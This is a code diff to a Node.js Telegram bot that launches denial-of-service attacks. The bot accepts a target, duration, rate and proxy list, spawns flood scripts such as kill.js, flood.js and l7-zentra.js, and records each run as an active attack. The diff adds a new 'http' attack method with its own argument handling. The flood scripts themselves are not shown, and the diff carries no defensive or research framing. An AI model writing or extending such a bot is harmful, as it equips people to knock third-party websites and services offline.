@@ -89,7 +89,7 @@ bot.onText(/\/methods/, async (msg) => {
 
   if (!isAdmin && !isGroupActive) return
 
-  bot.sendMessage(chatId, 'Available methods: kill, flood, zentra')
+  bot.sendMessage(chatId, 'Available methods: kill, flood, zentra, http')
 })
 
 bot.onText(/\/bot\s+(on|off)/, async (msg, match) => {
@@ -137,8 +137,8 @@ bot.on('message', async (msg) => {
     const thread = 10
     const proxy = './prx.txt'
 
-    if (!['kill', 'flood', 'zentra'].includes(method)) {
-      bot.sendMessage(id, 'Method must be "kill", "flood", or "zentra".')
+    if (!['kill', 'flood', 'zentra', 'http'].includes(method)) {
+      bot.sendMessage(id, 'Method must be "kill", "flood", "zentra", or "http".')
       return
     }
 
@@ -163,10 +163,11 @@ bot.on('message', async (msg) => {
       return
     }
 
-    const scriptFile = method === 'kill' ? './kill.js' : method === 'flood' ? './flood.js' : './l7-zentra.js'
-    const cmd = spawn('node', [scriptFile, target, time, rate, thread, proxy], { stdio: ['ignore', 'pipe', 'pipe'] })
+    const scriptFile = method === 'kill' ? './kill.js' : method === 'flood' ? './flood.js' : method === 'zentra' ? './l7-zentra.js' : './http.js'
+    const cmdArgs = method === 'http' ? [scriptFile, target, time, proxy] : [scriptFile, target, time, rate, thread, proxy]
+    const cmd = spawn('node', cmdArgs, { stdio: ['ignore', 'pipe', 'pipe'] })
     const attackId = `${userId}_${Date.now()}`
-    activeAttacks[attackId] = { cmd, target, time, rate, thread, proxy, userId, remainingTime: time, messageId: null, startTime: Date.now() }
+    activeAttacks[attackId] = { cmd, target, time, rate, thread, proxy, userId, remainingTime: time, messageId: null, startTime: Date.now(), method }
 
     const response = {
       status: 'Attack Started',
